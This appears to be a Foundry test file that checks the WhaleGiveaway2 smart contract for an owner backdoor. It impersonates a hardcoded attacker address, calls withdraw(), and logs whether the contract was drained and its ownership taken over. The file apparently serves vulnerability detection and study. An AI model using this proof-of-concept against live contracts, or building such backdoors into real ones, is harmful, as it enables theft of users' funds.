// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x3f2ef511aa6e75231e4deafc7a3d2ecab3741de2.sol";

contract WhaleGiveaway2Test is Test {
    WhaleGiveaway2 public giveaway;
    address public attacker = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;

    function setUp() public {
        giveaway = new WhaleGiveaway2();
    }

    function testOwnerBackdoor() public {
        // Send ETH to contract
        vm.deal(address(giveaway), 1 ether);

        console2.log("--- BEFORE-Trigger State ---");
        uint256 contractBalanceBefore = address(giveaway).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        address ownerBefore = giveaway.Owner();
        console2.log("Contract ETH balance: %d", contractBalanceBefore);
        console2.log("Attacker ETH balance: %d", attackerBalanceBefore);
        console2.log("Contract owner: %s", ownerBefore);

        console2.log("--- Trigger: withdraw called by attacker ---");
        vm.startPrank(attacker);
        giveaway.withdraw();
        vm.stopPrank();

        console2.log("--- AFTER-Trigger State ---");
        uint256 contractBalanceAfter = address(giveaway).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        address ownerAfter = giveaway.Owner();
        console2.log("Contract ETH balance: %d", contractBalanceAfter);
        console2.log("Attacker ETH balance: %d", attackerBalanceAfter);
        console2.log("Contract owner: %s", ownerAfter);

        bool contractDrained = contractBalanceAfter == 0;
        bool attackerReceived = attackerBalanceAfter == attackerBalanceBefore + 1 ether;
        bool ownerChanged = ownerAfter != ownerBefore;

        // Final vulnerability verdict
        if (contractDrained && attackerReceived && ownerChanged) {
            console2.log("Vulnerability Exists: All three states changed as expected (contract drained, attacker received funds, ownership changed)");
        } else if (!contractDrained) {
            console2.log("Vulnerability not Exist: Contract balance not drained");
        } else if (!attackerReceived) {
            console2.log("Vulnerability not Exist: Attacker didn't receive funds");
        } else if (!ownerChanged) {
            console2.log("Vulnerability not Exist: Contract ownership unchanged");
        }
    }
}